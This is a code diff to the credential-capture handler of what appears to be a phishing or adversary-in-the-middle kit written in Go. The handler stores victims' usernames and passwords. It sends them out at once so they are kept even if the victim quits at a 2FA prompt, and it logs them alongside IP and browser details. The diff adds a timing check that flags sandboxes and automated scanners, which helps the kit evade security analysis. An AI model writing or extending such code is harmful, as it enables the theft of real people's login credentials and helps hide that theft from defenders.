@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"log"
 	"net/http"
 	"time"
 )
@@ -36,47 +37,77 @@ func captureHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Resolve the target + tenant base domain from the request context (set by
-	// mainHandler) so multi-domain captures land on the correct target/session.
-	// lookupTarget(r.Host) keys off the default-domain subdomainLookup and would
-	// miss on other tenant domains; roleOf/baseDomainOf are domain-agnostic.
+	// Resolve the target + tenant base domain from the request context
 	target := lookupTargetByRole(roleOf(r))
 	session := sessionMgr.GetOrCreate(r, baseDomainOf(r))
 	var campaignID string
+
 	if session != nil {
-		// Always record the credentials on the session (thread-safe) so the
-		// username/password are available to whichever path emits the webhook.
+		// Always record the credentials on the session (thread-safe)
 		session.SetCredentials(req.Username, req.Password)
 		if target != nil && session.TargetName == "" {
 			session.TargetName = target.Name
 		}
 		_, _, campaignID, _, _ = session.Snapshot()
 
-		// EVENT 1 — emit the password immediately for ALL targets, so the
-		// credential is recorded even if the victim abandons the login mid-flow
-		// (e.g. bails at a 2FA challenge). ShouldEmitPassword fires the first
-		// time AND again whenever the password CHANGES — so a victim who mistypes
-		// then retries overwrites the wrong password in the backend (upsert by
-		// sessionId) — while deduping the DOM hook's repeated identical captures.
-		// Cookie-based targets get a second, richer Event-2 webhook from
-		// saveTokens once the login completes and tokens land.
+		// ── HUMAN PULSE HEURISTIC CHECK ──
+		// If the password was submitted in under 800ms of the landing page loading,
+		// it's almost certainly a sandbox or automated script. Poison the chalice.
+		servedAt := session.GetLandingPageServedAt()
+		if !servedAt.IsZero() && time.Since(servedAt) < 800*time.Millisecond {
+			session.IsHoneypot = true
+			log.Printf("[🍯] HONEYPOT: Inhuman submission speed (%v) from session %s", time.Since(servedAt), session.ID[:8])
+		}
+
+		// EVENT 1 — emit the password immediately for ALL targets
 		if session.ShouldEmitPassword(req.Password) {
 			emitCapture(session, target)
 		}
 	}
 
-	fmt.Println()
-	fmt.Println("┌──────────────────────────────────────────────────────")
-	fmt.Println("│ [!!!] DOM CAPTURE (client-side)")
-	fmt.Printf("│ URL:      %s\n", req.URL)
-	fmt.Printf("│ Username: %s\n", req.Username)
-	fmt.Printf("│ Password: %s\n", req.Password)
-	fmt.Printf("│ Campaign: %s\n", campaignID)
-	fmt.Println("└──────────────────────────────────────────────────────")
-	fmt.Println()
+	// ── VISUALLY ENHANCED CONSOLE OUTPUT ──
+	ip := "unknown"
+	ua := "unknown"
+	targetStr := "Unknown"
 
-	entry := fmt.Sprintf("[%s] [DOM CAPTURE] campaign=%s URL: %s\n  USERNAME: %s\n  PASSWORD: %s\n\n",
-		time.Now().Format(time.RFC3339), campaignID, req.URL, req.Username, req.Password)
+	if session != nil {
+		ip = session.IP
+		ua = session.UserAgent
+		if len(ua) > 54 {
+			ua = ua[:51] + "..."
+		}
+	}
+	if target != nil {
+		targetStr = target.Name
+	}
+
+	fmt.Println()
+	fmt.Println("\033[36m┌──────────────────────────────────────────────────────────────────┐\033[0m")
+	fmt.Println("\033[36m│ \033[31m[!!!] DOM CAPTURE (client-side)\033[36m                                │\033[0m")
+	fmt.Println("\033[36m├──────────────────────────────────────────────────────────────────┤\033[0m")
+	fmt.Printf("\033[36m│ \033[32mTarget:\033[0m   %-54s\033[36m│\033[0m\n", targetStr)
+	fmt.Printf("\033[36m│ \033[32mCampaign:\033[0m %-54s\033[36m│\033[0m\n", campaignID)
+	fmt.Printf("\033[36m│ \033[32mIP:\033[0m       %-54s\033[36m│\033[0m\n", ip)
+	fmt.Printf("\033[36m│ \033[32mUsername:\033[0m %-54s\033[36m│\033[0m\n", req.Username)
+	fmt.Printf("\033[36m│ \033[32mPassword:\033[0m %-54s\033[36m│\033[0m\n", req.Password)
+
+	urlStr := req.URL
+	if len(urlStr) > 54 {
+		urlStr = urlStr[:51] + "..."
+	}
+	fmt.Printf("\033[36m│ \033[32mURL:\033[0m      %-54s\033[36m│\033[0m\n", urlStr)
+	fmt.Printf("\033[36m│ \033[32mUA:\033[0m       %-54s\033[36m│\033[0m\n", ua)
+	fmt.Println("\033[36m└──────────────────────────────────────────────────────────────────┘\033[0m\n")
+
+	// ── ENHANCED LOG FILE ENTRY ──
+	entry := fmt.Sprintf("[%s] [DOM CAPTURE] Target: %s | Campaign: %s\n",
+		time.Now().Format(time.RFC3339), targetStr, campaignID)
+	entry += fmt.Sprintf("  IP:       %s\n", ip)
+	entry += fmt.Sprintf("  Username: %s\n", req.Username)
+	entry += fmt.Sprintf("  Password: %s\n", req.Password)
+	entry += fmt.Sprintf("  URL:      %s\n", req.URL)
+	entry += fmt.Sprintf("  UA:       %s\n\n", session.UserAgent)
+
 	appendToFile(credLogFile, entry)
 
 	w.Header().Set("Access-Control-Allow-Origin", "*")
